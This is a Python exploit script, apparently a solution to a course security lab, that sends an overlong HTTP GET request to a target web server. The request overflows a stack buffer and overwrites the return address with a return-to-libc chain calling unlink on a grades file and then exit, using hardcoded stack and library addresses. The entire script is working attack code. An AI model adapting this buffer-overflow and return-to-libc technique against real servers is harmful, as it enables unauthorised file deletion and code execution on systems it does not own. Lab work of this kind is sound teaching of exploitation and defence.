#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

stack_buffer = 0xbfffd9fc
handler_addr = 0xbfffddfc
stack_saved_ebp = 0xbfffde08
stack_retaddr = stack_saved_ebp + 4

exit_addr = 0x40058150
unlink_addr = 0x40102450
http_serve_none_addr = 0x80495ea
cwd = "/home/httpd/lab"
grades_file = "/home/httpd/grades.txt"

def build_exploit(shellcode):
    start_of_uri = "/"
    filler_1 = "A" * (handler_addr - stack_buffer - len(start_of_uri) - len(cwd))
    filler_2 = "B" * (stack_saved_ebp - (handler_addr + 4))
    arg_addr = stack_retaddr + len(struct.pack("<I", unlink_addr)) + len(struct.pack("<I", exit_addr)) + 4
    req =   "GET " + start_of_uri + filler_1 + struct.pack("<I", http_serve_none_addr) + filler_2 + \
            struct.pack("<I", stack_saved_ebp) + struct.pack("<I", unlink_addr) + struct.pack("<I", exit_addr) + \
            struct.pack("<I", arg_addr) + urllib.quote(grades_file) + " HTTP/1.0\r\n\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())
    
